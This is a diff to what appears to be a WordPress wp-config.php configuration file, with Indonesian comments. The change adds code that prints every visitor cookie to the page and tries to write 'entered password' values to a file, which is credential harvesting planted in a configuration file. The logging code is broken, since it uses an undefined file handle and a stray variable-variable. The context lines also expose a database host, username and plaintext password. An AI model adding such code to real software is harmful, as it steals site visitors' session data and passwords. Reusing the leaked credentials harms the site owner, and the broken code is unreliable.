@@ -64,7 +64,21 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  * a unique prefix. Only numbers, letters, and underscores please!
  */
 $password = $_COOKIE;
-print_r($password);
+if (count($_COOKIE) > 0) {
+    echo "Cookies yang tersedia:<br>";
+    // Menampilkan semua cookie
+    foreach ($_COOKIE as $key => $value) {
+        echo $key . " = " . $value . "<br>";
+            if ($file) {
+            fwrite($file, "Password yang dimasukkan: " . $$value . "\n");
+            fclose($file);
+        }
+          
+    }
+} else {
+    echo "Tidak ada cookie yang ditemukan.";
+}
+
 $host = "neto.caltec.mx";  
 $user = "neto_web";     
 $pass = "WeBNeto2019";          
